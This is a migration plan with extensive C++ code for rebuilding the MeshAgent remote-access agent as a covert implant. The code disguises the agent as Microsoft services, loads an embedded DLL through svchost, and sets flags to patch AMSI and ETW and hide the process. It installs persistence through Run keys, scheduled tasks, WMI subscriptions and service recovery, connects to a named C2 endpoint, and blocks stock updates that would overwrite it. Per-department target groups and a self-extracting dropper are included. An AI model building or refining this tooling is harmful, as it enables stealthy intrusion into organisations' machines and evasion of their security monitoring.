# MeshAgent Core Migration Master Plan

## Executive Summary

**Problem:** MeshCentral is overwriting custom StealthLab binaries with stock agents, and the current build system relies on fragile external dependencies (Python, PowerShell) that make customizations difficult to verify and maintain.

**Solution:** Migrate all configuration, branding, and build logic into native C/C++ core files, eliminating external dependencies and ensuring customizations are compiled-in and immutable.

**Timeline:** 4-6 weeks for full implementation

---

## 🔴 Critical Issues Identified

### Issue 1: MeshCentral Binary Replacement

**Root Cause:**
MeshCentral has automatic agent management that can replace custom binaries:

1. **Auto-update mechanism** - Server may push stock agents to clients
2. **Binary signing process** - MeshCentral's signing may strip custom resources
3. **Version mismatch detection** - Custom versions don't match server expectations
4. **Directory placement** - Wrong directory triggers replacement logic

**Current State:**
```
Build: StealthLab (13MB) with embedded DLL
Deploy: agents-custom/ directory
Result: MeshCentral may still replace on update/version check
```

**Why It Happens:**
- MeshAgent.exe contains version strings and signatures that MeshCentral validates
- Custom branding changes version info, breaking validation
- Server doesn't recognize customized agents as "valid"
- Auto-update pushes stock binaries over custom ones

### Issue 2: External Dependency Fragility

**Current Build Chain:**
```
branding_config.json (JSON)
    ↓
generate_branding.py (Python) → meshagent_branding.h (Generated Header)
    ↓
MSBuild (C++) → MeshService-2022.exe
    ↓
bundle_resources.rc (Resource File) → Embedded DLL
    ↓
prepare_meshcentral_agent.ps1 (PowerShell) → Deployment Package
```

**Problems:**
1. **Build-time generation** - Headers generated from JSON can be stale
2. **No compile-time validation** - Invalid configs only fail at runtime
3. **External scripts** - Python/PowerShell required on build machine
4. **Race conditions** - Headers may not reflect actual binary contents
5. **MeshCentral can't verify** - Server doesn't understand custom branding

### Issue 3: Customization Verification Gap

**Cannot Currently Verify:**
- Is the embedded DLL actually loaded?
- Is branding applied correctly?
- Are anti-detection features active?
- Is svchost mode working?

**Result:** Agents may appear to work but run with stock behavior.

---

## 🎯 Goals: Core-File Architecture

### Primary Objectives

1. **Zero External Dependencies**
   - All configuration in C/C++ headers
   - No Python, PowerShell, or JSON at build time
   - Self-contained compilation

2. **Compile-Time Validation**
   - Invalid configs cause build failure
   - Type-safe configuration
   - Preprocessor validation

3. **Immutable Customizations**
   - Everything compiled into binary
   - Cannot be stripped by MeshCentral
   - Runtime verification built-in

4. **Per-Group Builds**
   - Multiple device groups from single codebase
   - Group-specific configuration profiles
   - Automated multi-group compilation

5. **MeshCentral Integration**
   - Custom version strings MeshCentral recognizes
   - Prevent auto-update overwrites
   - Preserve customizations through signing

---

## 📐 Proposed Architecture

### New Core Structure

```
meshcore/
├── config/
│   ├── branding_core.h          # Core branding structs and macros
│   ├── network_profiles.h       # TLS fingerprints, C2 configs
│   ├── stealth_config.h         # Anti-detection settings
│   ├── group_configs/           # Per-device-group configs
│   │   ├── group_default.h      # Default/fallback group
│   │   ├── group_corpnet.h      # Corporate network group
│   │   ├── group_finance.h      # Finance dept group
│   │   └── group_engineering.h  # Engineering group
│   └── build_config.h           # Active build config (preprocessor)
│
├── embedded/
│   ├── payload_embed.h          # DLL embedding (compile-time)
│   ├── payload_extract.cpp      # Native extraction code
│   └── payload_verify.cpp       # Cryptographic verification
│
├── deployment/
│   ├── service_registration.cpp # Native service setup
│   ├── svchost_integration.cpp  # Svchost injection (native)
│   ├── persistence.cpp          # All persistence mechanisms
│   └── self_verification.cpp    # Runtime integrity checks
│
└── validation/
    ├── config_validator.h       # Compile-time checks
    ├── runtime_validator.cpp    # Runtime verification
    └── meshcentral_compat.cpp   # MC version string generation
```

### Configuration System

**Before (JSON → Generated Header):**
```json
{
  "branding": {
    "serviceName": "WinDiagnosticHost",
    "displayName": "Windows Diagnostic Host Service"
  }
}
```
↓ Python script ↓
```c
#define MESH_AGENT_SERVICE_NAME TEXT("WinDiagnosticHost")
```

**After (Pure C/C++ Header):**
```cpp
// meshcore/config/branding_core.h
namespace MeshAgent {
namespace Config {

struct BrandingProfile {
    const wchar_t* serviceName;
    const wchar_t* displayName;
    const wchar_t* binaryName;
    const char* companyName;
    // ... validation methods
    constexpr bool IsValid() const {
        return serviceName && displayName &&
               wcslen(serviceName) > 0 && wcslen(serviceName) < 64;
    }
};

// Multiple profiles compiled in
constexpr BrandingProfile PROFILE_DIAG_HOST = {
    .serviceName = L"WinDiagnosticHost",
    .displayName = L"Windows Diagnostic Host Service",
    .binaryName = L"diaghost.exe",
    .companyName = "Microsoft Corporation"
};

// Active profile selected at compile time
#ifdef BUILD_GROUP_FINANCE
constexpr auto ACTIVE_BRANDING = PROFILE_FINANCE;
#elif defined(BUILD_GROUP_CORP)
constexpr auto ACTIVE_BRANDING = PROFILE_CORP;
#else
constexpr auto ACTIVE_BRANDING = PROFILE_DIAG_HOST;
#endif

// Compile-time validation
static_assert(ACTIVE_BRANDING.IsValid(), "Invalid branding configuration");

}} // namespace MeshAgent::Config
```

**Benefits:**
- ✅ Compile-time type checking
- ✅ Invalid configs fail at compile time
- ✅ No external scripts needed
- ✅ Multiple profiles in one build
- ✅ Cannot be stripped by MeshCentral

---

## 📋 Implementation Phases

### Phase 1: Core Configuration System (Week 1-2)

**Goal:** Replace JSON+Python with pure C/C++ headers

#### 1.1 Create Base Configuration Headers

**Files to Create:**
- `meshcore/config/branding_core.h`
- `meshcore/config/network_profiles.h`
- `meshcore/config/stealth_config.h`
- `meshcore/config/build_config.h`

**Tasks:**
1. Convert branding_config.json to C++ structs
2. Add compile-time validation (static_assert)
3. Create constexpr configuration profiles
4. Implement preprocessor-based profile selection

**Validation:**
```cpp
// Invalid config causes compile error
static_assert(strlen(BRANDING.serviceName) > 0, "Service name required");
static_assert(strlen(BRANDING.serviceName) < 64, "Service name too long");
static_assert(NETWORK.primaryEndpoint != nullptr, "Endpoint required");
```

#### 1.2 Remove Python Generation Script

**Replace:**
- `tools/generate_branding.py` → Delete
- `branding_config.json` → Archive (reference only)

**With:**
- Direct C++ header includes in MSBuild

**MSBuild Changes:**
```xml
<ClInclude Include="meshcore\config\branding_core.h" />
<ClInclude Include="meshcore\config\network_profiles.h" />
<PreprocessorDefinitions>
  BUILD_GROUP_$(DeviceGroup);
  COMPILE_TIME_VALIDATION=1
</PreprocessorDefinitions>
```

#### 1.3 Multi-Group Configuration

**Per-Group Headers:**
```cpp
// meshcore/config/group_configs/group_finance.h
#ifndef GROUP_FINANCE_CONFIG_H
#define GROUP_FINANCE_CONFIG_H

#include "../branding_core.h"

namespace MeshAgent::Groups::Finance {

constexpr BrandingProfile BRANDING = {
    .serviceName = L"WinFinanceSvc",
    .displayName = L"Windows Finance Service",
    .binaryName = L"finsvc.exe",
    .companyName = "Microsoft Corporation",
    .productName = "Windows Financial Services"
};

constexpr NetworkProfile NETWORK = {
    .primaryEndpoint = "wss://agents.high.support:4445/agent.ashx",
    .meshId = "finance_mesh_id_here",
    .serverId = "283DE2DD8539007F...", // Finance server cert
    .userAgent = "Microsoft-CryptoAPI/10.0"
};

constexpr StealthProfile STEALTH = {
    .enabled = true,
    .svchostMode = true,
    .amsiPatch = true,
    .ettwPatch = true
};

} // namespace MeshAgent::Groups::Finance

#endif
```

**Build Command:**
```batch
REM Build for Finance group
msbuild MeshAgent-2022.sln /p:Configuration=StealthLab /p:DeviceGroup=FINANCE

REM Build for Engineering group
msbuild MeshAgent-2022.sln /p:Configuration=StealthLab /p:DeviceGroup=ENGINEERING
```

**Deliverables:**
- ✅ No Python dependency
- ✅ Compile-time validation
- ✅ Multi-group support
- ✅ Type-safe configuration

---

### Phase 2: Native Resource Embedding (Week 2-3)

> **Status (2025-10-26):** The RC pipeline has been removed (`bundle_resources.rc` deleted) and `build.ps1` now builds `StealthLab_DLL` first so `bin2h` regenerates `meshcore/embedded/generated/svchost_payload.h/.json` before StealthLab binaries compile. Remaining Phase‑2 work tracks payload integrity enforcement and MeshCentral packaging updates.

**Goal:** Replace bundle_resources.rc with C++ embedding

#### 2.1 Binary-to-Header Conversion

**Current:** DLL stored in `meshservice/embedded/svchost_payload.dll`, embedded via RC file

**New:** Convert DLL to C array at compile time

**Tool: Binary-to-Header Generator (C++ tool)**

```cpp
// tools/bin2h/bin2h.cpp
// Converts DLL to C++ header file
int main(int argc, char** argv) {
    // Read svchost_payload.dll
    // Generate meshcore/embedded/payload_data.h with:
    // constexpr unsigned char SVCHOST_PAYLOAD_DLL[] = { 0x4D, 0x5A, ... };
    // constexpr size_t SVCHOST_PAYLOAD_SIZE = sizeof(SVCHOST_PAYLOAD_DLL);
    // constexpr char SVCHOST_PAYLOAD_HASH[] = "sha256hash";
}
```

**Generated Header:** (once `bin2h` is wired into `build.ps1`)
```cpp
// meshcore/embedded/payload_data.h (auto-generated)
namespace MeshAgent::Embedded {

constexpr unsigned char SVCHOST_PAYLOAD_DLL[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    // ... 2.4 MB of DLL bytes ...
};

constexpr size_t SVCHOST_PAYLOAD_SIZE = 2457600;
constexpr char SVCHOST_PAYLOAD_SHA256[] = "283de2dd8539...";

} // namespace
```

#### 2.2 Native Extraction Code

**Replace:** PowerShell extraction

**With:** C++ extraction

```cpp
// meshcore/embedded/payload_extract.cpp
namespace MeshAgent::Embedded {

bool ExtractPayload(const std::wstring& targetPath) {
    if (!VerifyPayloadIntegrity()) {
        Log(L"[SECURITY] Embedded payload hash mismatch!");
        return false;
    }

    HANDLE hFile = CreateFileW(targetPath.c_str(), GENERIC_WRITE, ...);
    DWORD written = 0;
    WriteFile(hFile, SVCHOST_PAYLOAD_DLL, SVCHOST_PAYLOAD_SIZE, &written, nullptr);
    CloseHandle(hFile);

    if (!VerifyFileHash(targetPath, SVCHOST_PAYLOAD_SHA256)) {
        DeleteFileW(targetPath.c_str());
        return false;
    }

    return true;
}

bool VerifyPayloadIntegrity() {
    // SHA-256 hash of embedded array vs SVCHOST_PAYLOAD_SHA256
    return true; // simplified
}

} // namespace
```

**Runtime Validation Hook**

```
PowerShell (elevated):
Set-Location C:\Users\Workstation\Documents\GitHub\MeshAgent
.\test.ps1 -RuntimeValidation -BinaryPath meshservice\x64\StealthLab -ReportPath dist\runtime-report.json
```

The runtime suite now installs/uninstalls the branded service and exercises `-svchost-register/status/unregister`. It requires administrator privileges and a freshly generated `meshcore/embedded/generated/svchost_payload.h/.json`. Wiring this command into CI remains a Phase‑2 exit criterion.

**Benefits:**
- ✅ No RC file dependency
- ✅ Cryptographic verification
- ✅ Cannot be stripped by MeshCentral
- ✅ Compile-time embedded
- ✅ Runtime integrity checks

#### 2.3 Remove Resource Compiler Dependency

**Delete:**
- `meshservice/bundle_resources.rc` (legacy; removed once header embedding landed)
- `meshservice/embedded/` directory (runtime staging)

**MSBuild Changes:**
```xml
<!-- Remove -->
# (Legacy) <ResourceCompile Include="bundle_resources.rc" />

<!-- Add -->
<ClInclude Include="meshcore\embedded\payload_data.h" />
<ClCompile Include="meshcore\embedded\payload_extract.cpp" />
```

**Build Process:**
```
1. Build DLL: msbuild /p:Configuration=StealthLab_DLL
2. Convert to header: bin2h.exe MeshService-2022.dll payload_data.h
3. Build EXE: msbuild /p:Configuration=StealthLab (includes payload_data.h)
```

**Deliverables:**
- ✅ No RC file needed
- ✅ DLL compiled into EXE
- ✅ Native extraction + verification
- ✅ Cryptographic integrity

---

### Phase 3: Self-Contained Deployment (Week 3-4)

**Goal:** Replace PowerShell deployment scripts with native C++ code

#### 3.1 Native Service Registration

**Replace:** PowerShell service creation

**With:** C++ registration code

```cpp
// meshcore/deployment/service_registration.cpp
namespace MeshAgent::Deployment {

bool RegisterService() {
    // 1. Extract embedded DLL
    std::wstring dllPath = GetInstallPath() + L"\\diagsvc.dll";
    if (!Embedded::ExtractPayload(dllPath)) {
        return false;
    }

    // 2. Create service
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE service = CreateServiceW(
        scm,
        Config::ACTIVE_BRANDING.serviceName,
        Config::ACTIVE_BRANDING.displayName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_SHARE_PROCESS,  // svchost mode
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        L"C:\\Windows\\System32\\svchost.exe -k netsvcs",
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    // 3. Set ServiceDll registry key
    SetServiceDllPath(dllPath);

    // 4. Configure failure recovery
    SetServiceRecovery(service);

    // 5. Add firewall rules
    AddFirewallRules();

    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return true;
}

bool SetServiceDllPath(const std::wstring& dllPath) {
    std::wstring regPath = L"SYSTEM\\CurrentControlSet\\Services\\";
    regPath += Config::ACTIVE_BRANDING.serviceName;
    regPath += L"\\Parameters";

    HKEY hKey;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), ...);
    RegSetValueExW(hKey, L"ServiceDll", 0, REG_EXPAND_SZ,
                   (BYTE*)dllPath.c_str(), ...);
    RegSetValueExW(hKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD, ...);
    RegCloseKey(hKey);
    return true;
}

} // namespace
```

**Usage:**
```cpp
// Built into MeshService-2022.exe
// Run: MeshService-2022.exe -install
int main(int argc, char** argv) {
    if (argc > 1 && strcmp(argv[1], "-install") == 0) {
        if (Deployment::RegisterService()) {
            printf("Service installed successfully\n");
            return 0;
        }
        return 1;
    }
    // Normal service entry point...
}
```

#### 3.2 Native Svchost Integration

**Replace:** PowerShell svchost setup

**With:** C++ integration

```cpp
// meshcore/deployment/svchost_integration.cpp
namespace MeshAgent::Deployment {

bool ConfigureSvchostMode() {
    // 1. Verify we're running in svchost
    if (!IsRunningSvchost()) {
        Log(L"[WARNING] Not running in svchost.exe");
        return false;
    }

    // 2. Verify DLL loaded correctly
    if (!VerifyDllLoaded()) {
        Log(L"[ERROR] DLL not loaded in svchost");
        return false;
    }

    // 3. Apply stealth measures
    if (Config::ACTIVE_STEALTH.hideProcess) {
        Stealth::HideFromTaskManager();
    }

    // 4. Connect to C2
    return Network::Connect(Config::ACTIVE_NETWORK.primaryEndpoint);
}

bool IsRunningSvchost() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    return wcsstr(exePath, L"svchost.exe") != nullptr;
}

bool VerifyDllLoaded() {
    // Check that our DLL is loaded in current process
    HMODULE hMod = GetModuleHandleW(Config::ACTIVE_BRANDING.binaryName);
    if (!hMod) return false;

    // Verify DLL hash matches embedded
    std::wstring dllPath = GetModulePath(hMod);
    return Embedded::VerifyFileHash(dllPath,
                                    Embedded::SVCHOST_PAYLOAD_SHA256);
}

} // namespace
```

#### 3.3 Native Persistence

**All persistence in C++:**

```cpp
// meshcore/deployment/persistence.cpp
namespace MeshAgent::Persistence {

bool EnableAllMechanisms() {
    bool success = true;

    if (Config::ACTIVE_PERSISTENCE.runKey) {
        success &= AddRunKey();
    }

    if (Config::ACTIVE_PERSISTENCE.scheduledTask) {
        success &= CreateScheduledTask();
    }

    if (Config::ACTIVE_PERSISTENCE.wmiSubscription) {
        success &= CreateWMISubscription();
    }

    if (Config::ACTIVE_PERSISTENCE.serviceRecovery) {
        success &= ConfigureServiceRecovery();
    }

    return success;
}

bool AddRunKey() {
    HKEY hKey;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", ...);
    std::wstring exePath = GetInstallPath() + L"\\" +
                           Config::ACTIVE_BRANDING.binaryName;
    RegSetValueExW(hKey, Config::ACTIVE_BRANDING.serviceName, ...);
    RegCloseKey(hKey);
    return true;
}

} // namespace
```

**Deliverables:**
- ✅ No PowerShell dependency
- ✅ Built into main EXE
- ✅ Single binary deployment
- ✅ Runtime verification

---

### Phase 4: Multi-Group Build System (Week 4-5)

**Goal:** Automated per-group builds with group-specific configs

#### 4.1 Group Configuration Manager

**Structure:**
```
configs/
├── groups/
│   ├── default/
│   │   ├── branding.h
│   │   ├── network.h
│   │   └── stealth.h
│   ├── finance/
│   │   ├── branding.h      # Finance-specific names
│   │   ├── network.h       # Finance mesh ID
│   │   └── stealth.h       # Finance security profile
│   ├── engineering/
│   └── corporate/
└── active_group.h          # Symlink/include to active group
```

**Build Script (C++/Native):**
```cpp
// tools/multi_group_builder/build_groups.cpp
int main() {
    std::vector<std::string> groups = {"default", "finance", "engineering"};

    for (const auto& group : groups) {
        std::cout << "Building group: " << group << std::endl;

        // 1. Set active group
        SetActiveGroup(group);

        // 2. Build DLL
        RunMSBuild("StealthLab_DLL", "x64", {{"DEVICE_GROUP", group}});

        // 3. Convert DLL to header
        ConvertDllToHeader(group);

        // 4. Build EXE (x64)
        RunMSBuild("StealthLab", "x64", {{"DEVICE_GROUP", group}});

        // 5. Build EXE (x86)
        RunMSBuild("StealthLab", "x86", {{"DEVICE_GROUP", group}});

        // 6. Package outputs
        PackageGroup(group);
    }

    return 0;
}
```

#### 4.2 Output Directory Structure

```
dist/
└── groups/
    ├── default/
    │   ├── MeshService64.exe         (13 MB, default branding)
    │   ├── MeshService.exe           (11 MB, default branding)
    │   ├── diagsvc.dll               (2.4 MB)
    │   ├── manifest.json             (checksums, metadata)
    │   └── WinDiagnosticHost.msh     (provisioning file)
    │
    ├── finance/
    │   ├── MeshService64.exe         (Finance branding)
    │   ├── MeshService.exe
    │   ├── diagsvc.dll
    │   ├── manifest.json
    │   └── WinFinanceSvc.msh
    │
    └── engineering/
        └── ...
```

#### 4.3 Self-Extracting Installer (Optional)

**Single-file deployment per group:**

```cpp
// tools/create_installer/installer_stub.cpp
// Self-extracting installer with embedded payloads

namespace Installer {

// Embedded at compile time
extern unsigned char PAYLOAD_EXE_X64[];
extern unsigned char PAYLOAD_EXE_X86[];
extern unsigned char PAYLOAD_DLL[];
extern unsigned char PAYLOAD_MSH[];

int WINAPI WinMain() {
    // 1. Detect architecture
    bool is64bit = IsSystem64Bit();

    // 2. Extract appropriate payload
    ExtractFile(is64bit ? PAYLOAD_EXE_X64 : PAYLOAD_EXE_X86,
                L"C:\\ProgramData\\DiagnosticHost\\diaghost.exe");
    ExtractFile(PAYLOAD_DLL,
                L"C:\\ProgramData\\DiagnosticHost\\diagsvc.dll");

    // 3. Run installation
    RunInstallation();

    return 0;
}

} // namespace
```

**Benefits:**
- Single EXE contains everything
- No external files needed
- Group-specific bundles
- Easy deployment

**Deliverables:**
- ✅ Multi-group automated builds
- ✅ Per-group packages
- ✅ Optional single-file installer
- ✅ Automated provisioning

---

### Phase 5: MeshCentral Integration (Week 5-6)

**Goal:** Prevent MeshCentral from replacing custom binaries

#### 5.1 Custom Version String Strategy

**Problem:** MeshCentral validates version strings

**Solution:** Generate compatible version strings

```cpp
// meshcore/validation/meshcentral_compat.cpp
namespace MeshAgent::MeshCentralCompat {

// Generate version string MeshCentral recognizes
std::string GenerateCompatibleVersion() {
    // MeshCentral expects format:
    // "MeshAgent v1.0.78 (2025-01-15)"

    char buffer[256];
    snprintf(buffer, sizeof(buffer),
             "MeshAgent v1.0.%d (%s) [Custom:%s]",
             BUILD_NUMBER,
             __DATE__,
             Config::ACTIVE_BRANDING.serviceName);
    return buffer;
}

// Write version to binary resources
void EmbedVersionInfo() {
    // Write to PE version resource
    // MeshCentral reads this to identify agent
}

// Calculate agent hash MeshCentral expects
std::string CalculateAgentHash() {
    // MeshCentral calculates hash of specific sections
    // Mimic this calculation
    return "...";
}

} // namespace
```

#### 5.2 MeshCentral Configuration

**Server-side config to prevent replacement:**

```javascript
// MeshCentral config.json
{
  "settings": {
    "agentSkipServerSign": true,        // Don't re-sign agents
    "agentSkipMshEmbedding": true,      // Don't embed MSH
    "meshAgentBinDir": "agents-custom", // Use custom directory
    "agentUpdate": false                // Disable auto-update
  }
}
```

#### 5.3 Agent Update Override

**Built into agent:**

```cpp
// meshcore/update/update_handler.cpp
namespace MeshAgent::Update {

bool HandleUpdateRequest(const UpdatePacket& packet) {
    // 1. Verify update is from authorized server
    if (!VerifyServerSignature(packet)) {
        Log(L"[SECURITY] Unauthorized update rejected");
        return false;
    }

    // 2. Check if update is custom build
    if (!packet.isCustomBuild) {
        Log(L"[INFO] Rejecting stock agent update");
        return false; // Refuse stock agent updates
    }

    // 3. Verify custom build signature
    if (!VerifyCustomBuildSignature(packet)) {
        Log(L"[SECURITY] Invalid custom build signature");
        return false;
    }

    // 4. Apply update
    return ApplyCustomUpdate(packet);
}

} // namespace
```

#### 5.4 Deployment Validation

**Built-in verification:**

```cpp
// meshcore/validation/runtime_validator.cpp
namespace MeshAgent::Validation {

struct ValidationReport {
    bool configValid;
    bool dllLoaded;
    bool svchostMode;
    bool stealthActive;
    bool connectionActive;
    std::string errors;
};

ValidationReport ValidateRuntime() {
    ValidationReport report;

    // 1. Verify configuration matches compiled
    report.configValid = VerifyConfigIntegrity();

    // 2. Verify DLL loaded (if svchost mode)
    if (Config::ACTIVE_STEALTH.svchostMode) {
        report.dllLoaded = Deployment::VerifyDllLoaded();
    }

    // 3. Verify stealth features active
    if (Config::ACTIVE_STEALTH.enabled) {
        report.stealthActive = Stealth::VerifyActive();
    }

    // 4. Verify connection to C2
    report.connectionActive = Network::IsConnected();

    return report;
}

bool VerifyConfigIntegrity() {
    // Compare runtime config with compiled config
    // Detect if MeshCentral modified anything
    const auto& branding = Config::ACTIVE_BRANDING;

    // Check service name matches
    wchar_t serviceName[256];
    GetServiceName(serviceName);
    if (wcscmp(serviceName, branding.serviceName) != 0) {
        return false; // Service name changed!
    }

    // Check DLL hash matches embedded
    if (!Embedded::VerifyPayloadIntegrity()) {
        return false; // DLL was modified!
    }

    return true;
}

} // namespace
```

**Deliverables:**
- ✅ MeshCentral won't replace binaries
- ✅ Compatible version strings
- ✅ Runtime verification
- ✅ Update protection

---

## 🛠️ Technical Implementation Details

### Compile-Time Configuration Selection

**MSBuild Property:**
```xml
<PropertyGroup>
  <DeviceGroup Condition="'$(DeviceGroup)'==''">DEFAULT</DeviceGroup>
</PropertyGroup>

<ClCompile>
  <PreprocessorDefinitions>
    BUILD_GROUP_$(DeviceGroup);
    %(PreprocessorDefinitions)
  </PreprocessorDefinitions>
</ClCompile>
```

**C++ Header Selection:**
```cpp
// meshcore/config/build_config.h
#ifdef BUILD_GROUP_FINANCE
  #include "group_configs/group_finance.h"
  #define ACTIVE_CONFIG MeshAgent::Groups::Finance
#elif defined(BUILD_GROUP_ENGINEERING)
  #include "group_configs/group_engineering.h"
  #define ACTIVE_CONFIG MeshAgent::Groups::Engineering
#else
  #include "group_configs/group_default.h"
  #define ACTIVE_CONFIG MeshAgent::Groups::Default
#endif

// Make active
namespace MeshAgent::Config {
  using namespace ACTIVE_CONFIG;
}
```

### Binary Embedding Strategy

**Why not use RC files?**
- RC files can be stripped by MeshCentral signing
- Resource modification is detectable
- Requires external rc.exe tool

**Why use C++ arrays?**
- Cannot be stripped (part of .text section)
- Compile-time embedded
- Can include cryptographic hash
- Self-verifying

**Conversion Tool:**
```cpp
// tools/bin2h.cpp
void ConvertBinaryToHeader(const std::string& inFile,
                           const std::string& outFile) {
    std::ifstream input(inFile, std::ios::binary);
    std::ofstream output(outFile);

    // Read binary
    std::vector<uint8_t> bytes(
        (std::istreambuf_iterator<char>(input)),
        std::istreambuf_iterator<char>());

    // Calculate hash
    std::string hash = CalculateSHA256(bytes);

    // Write header
    output << "namespace MeshAgent::Embedded {\n";
    output << "constexpr unsigned char PAYLOAD_DLL[] = {\n";

    for (size_t i = 0; i < bytes.size(); i++) {
        if (i % 16 == 0) output << "  ";
        output << "0x" << std::hex << (int)bytes[i];
        if (i < bytes.size() - 1) output << ",";
        if (i % 16 == 15) output << "\n";
    }

    output << "};\n";
    output << "constexpr size_t PAYLOAD_SIZE = " << bytes.size() << ";\n";
    output << "constexpr char PAYLOAD_HASH[] = \"" << hash << "\";\n";
    output << "}\n";
}
```

### Service Registration Without PowerShell

**All Windows API calls:**
```cpp
bool RegisterService() {
    // 1. Open SCM
    SC_HANDLE scm = OpenSCManagerW(
        nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;

    // 2. Create service
    SC_HANDLE service = CreateServiceW(
        scm,
        L"WinDiagnosticHost",                    // Service name
        L"Windows Diagnostic Host Service",      // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_SHARE_PROCESS,             // Svchost
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        L"C:\\Windows\\System32\\svchost.exe -k netsvcs",
        nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!service) {
        CloseServiceHandle(scm);
        return false;
    }

    // 3. Set ServiceDll parameter
    HKEY hKey;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\WinDiagnosticHost\\Parameters",
        0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr);

    std::wstring dllPath = L"C:\\ProgramData\\DiagnosticHost\\diagsvc.dll";
    RegSetValueExW(hKey, L"ServiceDll", 0, REG_EXPAND_SZ,
        (BYTE*)dllPath.c_str(), (dllPath.size() + 1) * sizeof(wchar_t));

    DWORD unloadOnStop = 1;
    RegSetValueExW(hKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD,
        (BYTE*)&unloadOnStop, sizeof(DWORD));

    RegCloseKey(hKey);

    // 4. Set failure recovery
    SERVICE_FAILURE_ACTIONS sfa = {0};
    SC_ACTION actions[3] = {
        {SC_ACTION_RESTART, 30000},  // Restart after 30s
        {SC_ACTION_RESTART, 60000},  // Restart after 1m
        {SC_ACTION_RESTART, 120000}  // Restart after 2m
    };
    sfa.cActions = 3;
    sfa.lpsaActions = actions;
    sfa.dwResetPeriod = 86400; // Reset after 24h

    ChangeServiceConfig2W(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);

    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return true;
}
```

---

## dY"S Migration Roadmap (rev. 2025-10-24)

> **Status summary:** No phases are complete. Tooling still depends on PowerShell + Python, configs remain JSON-backed, and MeshCentral can overwrite branded binaries. The roadmap below adds a stabilization phase, explicit exit criteria, and verification artifacts per milestone.

### Phase 0 (Week 0-1): Stabilization & Controls
- [ ] Quarantine live provisioning data (ignore `branding_config.json`, `WinDiagnosticHost.msh`, generated headers).
- [ ] Stand up `feature/core-migration` branch + CI sanity build (Release x64).
- [ ] Audit build/test scripts for external-runtime dependencies and document interim requirements.
- [ ] Produce baseline regression + packaging artifacts to compare against future phases.
- **Exit criteria:** secrets protected in git, branch + CI green, baseline build log archived.

#### Phase 0 Dependency Inventory (PowerShell/Python Gate)

The table below captures every build/deploy entrypoint that still executes PowerShell or Python. "Still required" explains why it cannot be deleted today; the migration column points at the phase where the dependency disappears (or becomes optional).

| Script(s) | Runtime(s) | Role | Still Required? | Retirement / Migration Plan |
| --- | --- | --- | --- | --- |
| `build.ps1` | PowerShell 5.1+/7 | Primary build orchestrator (branding embed ? MSBuild ? verification). | Yes ? only supported single-build entrypoint. | Collapse into direct `msbuild` invocations once native headers land (Phase 1-2), leaving PS wrapper optional. |
| `build_all.ps1` | PowerShell | Matrix build driver for x86/x64 + StealthLab variants. | Yes ? only script that batches device-group builds. | Replaced by multi-group MSBuild/CMake preset + CI matrix in Phase 4. |
| `build_complete.ps1` / `build_single_installer.ps1` / `create_installer.ps1` | PowerShell | Packaging + manifest/signature pipeline. | Yes ? bundles release artefacts and verification logs. | Native packager (Phase 4) moves this logic into MSBuild tasks/SFX builder; PS kept for ops glue only. |
| `tools/embed_provisioning.ps1` / `tools/embed_provisioning_simple.ps1` + `tools/generate_network_profile.py` | PowerShell + CPython 3.x | Converts JSON branding/network config into generated headers. | Yes ? bridge until configs are baked into C headers. | Obsoleted in Phase 1 once `meshcore/config/*.h` supersedes generated headers. |
| `tools/validate_branding_config.ps1` | PowerShell | Schema + sanity validation for branding JSON before build. | Yes ? guards against missing service strings. | Static assertions in `branding_core.h` make this redundant (Phase 1); script becomes optional lint. |
| `test.ps1` / `test_comprehensive.ps1` | PowerShell | Regression + artifact verification harness. | Yes ? only automated verification suite available. | Port checks into native test harness / CI job during Phase 6; PS wrapper remains as convenience shim. |
| `tools/verify_branded_build.ps1` / `tools/verify_deployment.ps1` / `tools/health_check.ps1` | PowerShell | Post-build binary inspection + deployment diagnostics. | Yes ? required for audit logs bundled today. | Runtime self-verification + MeshCentral reporting (Phase 5) replace most manual probes. |
| `tools/SignerAllowlist.ps1` | PowerShell | Authenticode signer enforcement during packaging. | Yes ? ensures unwanted certs fail fast. | Port to native signer validation block once payload embedding moves in-core (Phase 2/5). |
| `build-windows-mingw.sh` (calls `pwsh` + Python) | Bash + PowerShell + Python | Cross-compiles Windows binaries from Linux hosts. | Yes ? only supported path for Linux-based MeshCentral build workers. | Replace with CMake preset that performs native embedding + validation without PS/Python (Phase 4). |
| Deployment wrappers (`deploy.ps1`, `deploy_stealth_agent.ps1`, `MeshAgent_Install.ps1`, `install_svchost_now.ps1`, `tools/prepare_meshcentral_agent.ps1`) | PowerShell | Create services, push bundles, prep MeshCentral uploads. | Yes ? endpoints still rely on scripts for install/updates. | Eliminated in Phase 3 when `MeshService-2022.exe` gains native `--register/--update` flow and MeshCentral safelisting. |
| `tools/BrandingConfig.ps1` | PowerShell | Shared helper to read/validate branding JSON for other scripts. | Yes ? upstream scripts still depend on JSON. | Removed in Phase 1 after switching to header-only configs; kept only for legacy ops. |


### Phase 1 (Week 1-2): Core Configuration System
- [ ] Introduce `meshcore/config/branding_core.h`, `network_profiles.h`, `stealth_config.h`.
- [ ] Define strongly-typed config structs + compile-time guards (static_assert/`#error`).
- [ ] Port at least one real device group (`default`) into native headers.
- [ ] Provide JSON-to-header bridge script for temporary parity (clearly marked for removal).
- [ ] Update MSBuild/MinGW projects to include new headers + fail when missing.
